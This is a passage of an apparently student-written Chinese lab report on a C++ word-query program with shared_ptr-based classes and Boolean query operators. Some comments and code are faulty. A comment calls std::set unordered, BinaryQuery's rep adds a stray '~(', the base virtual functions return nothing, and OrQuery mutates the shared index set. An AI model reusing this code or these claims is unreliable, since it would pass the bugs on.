style="color:rgb(0,0,0);">项目报告需对需求进行分析，描述实现方案与项目特色。报告应包含核心代码并进行解 </font></p><p><font style="color:rgb(0,0,0);">释。如果编译运行复杂，请提供编译运行代码的说明。提供运行结果的展示（如截图）， </font></p><p><font style="color:rgb(0,0,0);">并尽量给出性能展示与分析。最后给出总结。同时，鼓励写上实现代码时遇到的困难以及 </font></p><p><font style="color:rgb(0,0,0);">相应的解决思路</font><font style="color:rgb(0,0,0);">&#x2F;</font><font style="color:rgb(0,0,0);">方案。 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">15. </font><font style="color:rgb(0,0,0);">允许适当发挥，使得程序功能更加丰富。 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">16. 提示：可以参考书籍《C++ Primer 第五版》12.3节与15.9节内容。 </font></p><p>:::</p><h1 id="ye4Hl"><font style="color:rgb(0,0,0);">实验报告解析</font></h1><h2 id="Pz6p1">写在前面</h2><p>得到的一些小细节启发</p><p>1.智能指针的初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这样子是在堆上申请内存，同时也能调用set&lt;int&gt;的构造函数</span></span><br><span class="line">shared_ptr&lt;set&lt;<span class="type">int</span>&gt;&gt; ptr=make_shared&lt;set&lt;<span class="type">int</span>&gt;&gt;()</span><br><span class="line"><span class="comment">//如果是new的方法，会导致内存非法访问，大概是因为make_shared控制了它的作用域的问题</span></span><br></pre></td></tr></table></figure><p>2.ofstrem.wirte()方法适用于写二进制数据，而不是文本。</p><h2 id="Kyyb2">开始解析</h2><p>:::info<br><font style="color:rgb(0,0,0);">1. 使用 C++ 完成代码，确保程序可由 C++ 编译器（如g++）编译。 </font></p><p><font style="color:rgb(0,0,0);">2. </font><font style="color:rgb(0,0,0);">采用面向对象的思想编写程序，以使程序更为优雅可靠。程序应该尽可能符合正常使用习 </font></p><p><font style="color:rgb(0,0,0);">惯。 </font></p><p>:::</p><p><font style="color:rgb(0,0,0);">不需要装多余的库，我们需要用到的基本上STL都有，直接用STL和算法库就行了。因此不需要加多余的编译选项，能够通过编译就行。</font></p><p><font style="color:rgb(0,0,0);">本项目是为了实现一个文本查询的功能，需要读写文件操作，需要有文章，打印行号等，为了符合面向对象的思想，同时参考第16点提示去看了一下C++ Primer第五版的对应内容，设计了如下的类，为了适应本程序，所以类里面的对象和方法有一点小小改动。</font></p><p><font style="color:rgb(0,0,0);">接下来我们展示我们用到的类</font></p><p><font style="color:rgb(0,0,0);">首先是QueryResult和TextQuery类，第一个类设计的目的是为了保存查询后的结果，第二个TextQuery类设计的目的是为了打开文件进行读取操作，然后对文章的内容进行解析。</font></p><p><font style="color:rgb(0,0,0);">下面介绍这两个类的功能与作用，以及设计的思想：</font></p><h3 id="iBy3I"><font style="color:rgb(0,0,0);">基于面向对象的所用类介绍</font></h3><h4 id="R3Ror"><font style="color:rgb(0,0,0);">对于TextQuery</font></h4><p><font style="color:rgb(0,0,0);">首先对于一篇文章的获取首先要打开文件，程序要求我们查询单词，返回对应的行号和内容。</font></p><p><font style="color:rgb(0,0,0);">那么我们首先就要有一个容器存储行号，最好的是set<unsigned>，因为它无序性，不重复。</font></p><p><font style="color:rgb(0,0,0);">随后我们输入单词，要返回行号，明显是键值对的结构，这里采用map&lt;string,set<unsigned>&gt;，让它做自己排序</font></p><p><font style="color:rgb(0,0,0);">然后要打印其对应行号的内容，这说明我们要存储文章，采用vector<string>存储文章，每个元素就是它的句子。</font></p><p>对于第一个方法，我们在构造函数的时候，就应该把这两个成员处理好，我们读入文章首先要一个文件流，所以传参进来的是一个读入的文件流ifstream。然后一行一行读取进行分割就是。</p><p>第二个方法，我们query方法查找要返回一个结果类，结果QueryResult类的代码放在下面一个小标题，我们需要一个string来查询，根据查询的结果（有则返回对应的值，无则返回空集合）采用QueryResult的构造函数返回。</p><p><strong>那么问题来了，为了让QueryResult打印出对应的内容，QueryResult也需要传入一个存储文章的容器，这样直接拷贝的话就很麻烦，以及浪费空间，如果直接用TextQuery的file可能还有作用域非法访问的问题，所以我们把TextQuery的成员全部设置成共享指针，让shared_ptr来管理</strong>，因此才如代码所示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TextQuery</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">shared_ptr&lt;vector&lt;string&gt;&gt; file;<span class="comment">//存储文章的向量只能得指针</span></span><br><span class="line">map&lt;string,shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;&gt; wordmap;<span class="comment">//用unsigned存储行号</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//初始化需要一个文件流。</span></span><br><span class="line"><span class="built_in">TextQuery</span>(ifstream&amp; is):<span class="built_in">file</span>(<span class="keyword">new</span> vector&lt;string&gt;)<span class="comment">//对文件流的单词句子进行解读</span></span><br><span class="line">&#123;</span><br><span class="line">    string text;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">getline</span>(is,text))<span class="comment">//获取每一行</span></span><br><span class="line">        &#123;<span class="comment">//file是一个vector对象</span></span><br><span class="line">            file-&gt;<span class="built_in">push_back</span>(text);</span><br><span class="line">            <span class="type">int</span> n=file-&gt;<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//也就是行号？下标？</span></span><br><span class="line">            <span class="function">istringstream <span class="title">line</span><span class="params">(text)</span></span>;</span><br><span class="line">            string word;</span><br><span class="line">            <span class="keyword">while</span>(line &gt;&gt; word)<span class="comment">//用string这个流分解单词</span></span><br><span class="line">                &#123;<span class="comment">//匹配每一个单词</span></span><br><span class="line">                    shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; lines;<span class="comment">//map的值是一个(set对象的)智能指针</span></span><br><span class="line">                    <span class="keyword">if</span>(!wordmap.<span class="built_in">count</span>(word))&#123;<span class="comment">//如果不存在，说明是新单词，开辟一个set空间，并初始化</span></span><br><span class="line">                        lines = make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;();</span><br><span class="line">                        wordmap[word] = lines;</span><br><span class="line">                    &#125;</span><br><span class="line">                    wordmap[word]-&gt;<span class="built_in">insert</span>(n);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">QueryResult <span class="title">query</span><span class="params">(<span class="type">const</span> string&amp; inputword)</span><span class="type">const</span><span class="comment">//返回查找结果，查找结果是一个queryRE对象</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//如果未找到，就直接返回一个指向空的set的set共享指针</span></span><br><span class="line">    <span class="type">static</span> shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; <span class="built_in">nodata</span>(<span class="keyword">new</span> <span class="built_in">set</span>&lt;<span class="type">unsigned</span>&gt;());<span class="comment">//返回智能指针指向空set</span></span><br><span class="line">    <span class="keyword">auto</span> loc=wordmap.<span class="built_in">find</span>(inputword);</span><br><span class="line">    <span class="keyword">if</span>(loc == wordmap.<span class="built_in">end</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(inputword,nodata,file);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(inputword,loc-&gt;second,file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="RQI0Z"><font style="color:rgb(0,0,0);">对于QueryResult</font></h4><p>对于返回的结果类，我们首先肯定保存有指向文章vector的共享指针，然后还要保存选出来的行号set的共享指针，同时保存需要查询的单词。</p><p>同理，该让共享指针管理的就让它管理。该类具有一些获取本成员的方法，以及打印的方法。</p><p>在以后得利用差集计算非集，所以也弄了个返回指向文章全部行号的集合的共享指针的方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">QueryResult</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string inputword;<span class="comment">//需要查询的单词</span></span><br><span class="line">shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; idx;<span class="comment">//出现的行号</span></span><br><span class="line">shared_ptr&lt;vector&lt;string&gt;&gt; file;<span class="comment">//查找的文件</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">QueryResult</span>(string s,shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; i,shared_ptr&lt;vector&lt;string&gt;&gt; f):<span class="built_in">inputword</span>(s),<span class="built_in">idx</span>(i),<span class="built_in">file</span>(f)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;inputword&lt;&lt;<span class="string">&quot;\&quot;出现了&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;idx-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;次&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//打印出现的每一行</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> num:*(<span class="keyword">this</span>-&gt;idx))&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot; (line &quot;</span>&lt;&lt;num+<span class="number">1</span>&lt;&lt;<span class="string">&quot;) &quot;</span>;</span><br><span class="line">        cout&lt;&lt;*(<span class="keyword">this</span>-&gt;file-&gt;<span class="built_in">begin</span>()+num)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">shared_ptr&lt;vector&lt;string&gt;&gt; <span class="built_in">getfile</span>()&#123;<span class="comment">//返回file的共享指针</span></span><br><span class="line">    <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line">shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; <span class="built_in">getset</span>()&#123;<span class="comment">//返回行号的共享指针</span></span><br><span class="line">    <span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line">shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; <span class="built_in">getfileset</span>()&#123;<span class="comment">//返回整体行号的共享指针</span></span><br><span class="line">    shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; fileset =make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;();;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file-&gt;<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        fileset-&gt;<span class="built_in">insert</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fileset;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0,0,0);">到这里，已经可以实现查询一个单词的功能了</font></p><h4 id="eyY5A"><font style="color:rgb(0,0,0);">关于采用逻辑查询操作的类</font></h4><p>我们需要重载逻辑运算，逻辑运算单目是~，双目是|和&amp;，这就是它们的区别。</p><p>运算过程中，运算的操作数是什么类型的，运算后的结果又是什么类型？</p><p>虽然我们可以运算出一个集合，然后让两个集合进行逻辑运算，这样子可以实现eval计算的基本思路，但是如果我们还需要别方法呢，比如知道当前是在查询什么东西（如知道查询”~(a|b)”）</p><p>我们不妨设计一个类，参考书本设计了对应的类</p><p>我们按照对应的运算设计对应的类，如NotQuery<font style="color:rgb(63, 74, 84);">、</font>OrQuery<font style="color:rgb(63, 74, 84);">、</font>AndQuery，其中双目运算的类继承于BinaryQuery，然后再继承于QueryBase，NotQuery直接继承于QueryBase。<strong>然后就是各自对QueryBase的虚函数以及运算符进行重载</strong></p><p>我们让运算返回一个结果，这个结果如果是让共享指针去管理，那么就可以省很多问题，因此设计了Query，有一个成员是指向QueryBase类型的一个共享指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">QueryBase</span>&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Query</span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">unsigned</span> idx;<span class="comment">//没用的成员</span></span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">QueryBase</span>()&#123;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery&amp;)</span><span class="type">const</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> string <span class="title">rep</span><span class="params">()</span><span class="type">const</span></span>&#123;&#125;<span class="comment">//生成用于查询的rep文本</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WordQuery</span> : <span class="keyword">public</span> QueryBase&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Query</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">WordQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">//构造函数，接收string</span></span><br><span class="line">    <span class="built_in">WordQuery</span>(<span class="type">const</span> string &amp;s):<span class="built_in">query_word</span>(s)&#123;&#125;</span><br><span class="line">    <span class="comment">//重载虚构函数</span></span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;t)</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="built_in">query</span>(query_word);<span class="comment">//wordquery返回的结果就是根据单词本身返回的QueryRE</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span><span class="params">()</span> <span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> query_word;</span><br><span class="line">    &#125;</span><br><span class="line">    string query_word;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Query</span>&#123;</span><br><span class="line">    <span class="comment">//对三个运算符友元</span></span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> ~(<span class="type">const</span> Query&amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> |(<span class="type">const</span> Query&amp; ,<span class="type">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> &amp;(<span class="type">const</span> Query&amp; ,<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">//构造函数shared_ptr</span></span><br><span class="line">    <span class="comment">//传进来是 指向QueryBase类型的 共享指针</span></span><br><span class="line">    shared_ptr&lt;QueryBase&gt; q;<span class="comment">//指向基类的指针</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Query</span>(shared_ptr&lt;QueryBase&gt; query):<span class="built_in">q</span>(query)&#123;&#125;;</span><br><span class="line">    Query&amp; <span class="keyword">operator</span> =(<span class="type">const</span> Query&amp; que)&#123;</span><br><span class="line">        q=que.q;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Query</span>(<span class="type">const</span> string &amp;s)&#123;</span><br><span class="line">        <span class="function">shared_ptr&lt;WordQuery&gt; <span class="title">ptr</span><span class="params">(<span class="keyword">new</span> WordQuery(s))</span></span>;</span><br><span class="line">        q=ptr;</span><br><span class="line">    &#125;<span class="comment">//传进来是string类型的 用来构建WordQuery,来创建Query的q成员</span></span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;t)</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> q-&gt;<span class="built_in">eval</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span> <span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> q-&gt;<span class="built_in">rep</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> Query&amp; query)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> os &lt;&lt; query.<span class="built_in">rep</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotQuery</span> : <span class="keyword">public</span> QueryBase&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> ~(<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">NotQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">NotQuery</span>(<span class="type">const</span> Query &amp;q):<span class="built_in">query</span>(q)&#123;&#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~(&quot;</span>+query.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp; text)</span><span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> sml=query.<span class="built_in">eval</span>(text);</span><br><span class="line">        <span class="keyword">auto</span> smlset=sml.<span class="built_in">getset</span>();</span><br><span class="line">        <span class="keyword">auto</span> allset=sml.<span class="built_in">getfileset</span>();</span><br><span class="line">        set&lt;<span class="type">unsigned</span>&gt; resultset;</span><br><span class="line">        <span class="comment">//包含关系，差集即是非集，大减小即可。集合本身因为迭代特性所以本身就有序。</span></span><br><span class="line">        <span class="built_in">set_difference</span>(allset-&gt;<span class="built_in">begin</span>(),allset-&gt;<span class="built_in">end</span>(),smlset-&gt;<span class="built_in">begin</span>(),smlset-&gt;<span class="built_in">end</span>(),<span class="built_in">inserter</span>(resultset,resultset.<span class="built_in">begin</span>()));</span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; resultptr=make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;(resultset);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),resultptr,sml.<span class="built_in">getfile</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    Query query;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> Query <span class="keyword">operator</span>~ (<span class="type">const</span> Query &amp;operand)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;QueryBase&gt;(<span class="keyword">new</span> <span class="built_in">NotQuery</span>(operand));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryQuery</span> : <span class="keyword">public</span> QueryBase&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> ~(<span class="type">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">BinaryQuery</span>(<span class="type">const</span> Query &amp;l,<span class="type">const</span> Query &amp;r,string s):<span class="built_in">lhs</span>(l),<span class="built_in">rhs</span>(r),<span class="built_in">opSym</span>(s)&#123;&#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~(&quot;</span>+lhs.<span class="built_in">rep</span>()+<span class="string">&quot; &quot;</span>+opSym+<span class="string">&quot; &quot;</span>+rhs.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Query lhs,rhs;</span><br><span class="line">    string opSym;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrQuery</span> : <span class="keyword">public</span> BinaryQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> |(<span class="type">const</span> Query &amp;,<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">OrQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">OrQuery</span>(<span class="type">const</span> Query &amp;l,<span class="type">const</span> Query &amp; r):<span class="built_in">BinaryQuery</span>(l,r,<span class="string">&quot;|&quot;</span>)&#123;&#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;text)</span><span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="comment">//两个成员分别lhs,rhs。求并集不妨找他们返回的set的共享指针，然后用算法求</span></span><br><span class="line">        <span class="comment">//lhs和rhs都是WordQuery</span></span><br><span class="line">        <span class="keyword">auto</span> r=rhs.<span class="built_in">eval</span>(text),l=lhs.<span class="built_in">eval</span>(text);</span><br><span class="line">        <span class="keyword">auto</span> retlines=l.<span class="built_in">getset</span>();</span><br><span class="line">        retlines-&gt;<span class="built_in">insert</span>(r.<span class="built_in">getset</span>()-&gt;<span class="built_in">begin</span>(),r.<span class="built_in">getset</span>()-&gt;<span class="built_in">end</span>());<span class="comment">//左侧的插入右侧形成并集</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),retlines,l.<span class="built_in">getfile</span>());<span class="comment">//两个file都一样</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> Query <span class="keyword">operator</span>| (<span class="type">const</span> Query &amp;lhs,<span class="type">const</span> Query &amp;rhs)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;QueryBase&gt;(<span class="keyword">new</span> <span class="built_in">OrQuery</span>(lhs,rhs));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AndQuery</span> : <span class="keyword">public</span> BinaryQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> &amp;(<span class="type">const</span> Query &amp;,<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">AndQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">AndQuery</span>(<span class="type">const</span> Query &amp;l,<span class="type">const</span> Query &amp; r):<span class="built_in">BinaryQuery</span>(l,r,<span class="string">&quot;&amp;&quot;</span>)&#123;&#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;text)</span><span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="comment">//两个成员分别lhs,rhs。求交集不妨找他们返回的set的共享指针，然后用算法求</span></span><br><span class="line">        <span class="comment">//lhs和rhs都是WordQuery</span></span><br><span class="line">        <span class="keyword">auto</span> r=rhs.<span class="built_in">eval</span>(text),l=lhs.<span class="built_in">eval</span>(text);<span class="comment">//R和L是ResultQE</span></span><br><span class="line">        <span class="keyword">auto</span> lset=l.<span class="built_in">getset</span>(),rset=r.<span class="built_in">getset</span>();</span><br><span class="line">        set&lt;<span class="type">unsigned</span>&gt; resultset;</span><br><span class="line">        <span class="built_in">set_intersection</span>(lset-&gt;<span class="built_in">begin</span>(),lset-&gt;<span class="built_in">end</span>(),rset-&gt;<span class="built_in">begin</span>(),rset-&gt;<span class="built_in">end</span>(),<span class="built_in">inserter</span>(resultset,resultset.<span class="built_in">begin</span>()));</span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; resultptr=make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;(resultset);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),resultptr,l.<span class="built_in">getfile</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> 